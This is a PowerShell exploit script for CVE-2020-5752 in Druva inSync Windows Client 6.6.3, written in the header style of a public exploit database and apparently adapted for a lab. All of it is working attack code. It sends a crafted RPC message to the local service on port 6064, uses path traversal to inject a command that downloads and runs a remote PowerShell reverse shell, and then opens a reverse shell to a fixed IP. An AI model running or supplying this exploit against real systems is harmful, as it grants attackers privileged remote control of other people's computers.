# Exploit Title: Druva inSync Windows Client 6.6.3 - Local Privilege Escalation (PowerShell)
# Date: 2020-12-03
# Exploit Author: 1F98D
# Original Author: Matteo Malvica
# Vendor Homepage: druva.com
# Software Link: https://downloads.druva.com/downloads/inSync/Windows/6.6.3/inSync6.6.3r102156.msi
# Version: 6.6.3
# Tested on: Windows 10 (x64)
# CVE: CVE-2020-5752
# References: https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/
# Druva inSync exposes an RPC service which is vulnerable to a command injection attack.

$ErrorActionPreference = "Stop"

#Modify the $cmd variable in the Druva inSync exploit PoC script to download our PowerShell reverse shell into memory.
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.4:8080/shell.ps1')"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)

#changing the IP to match our address and listening port as well
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443
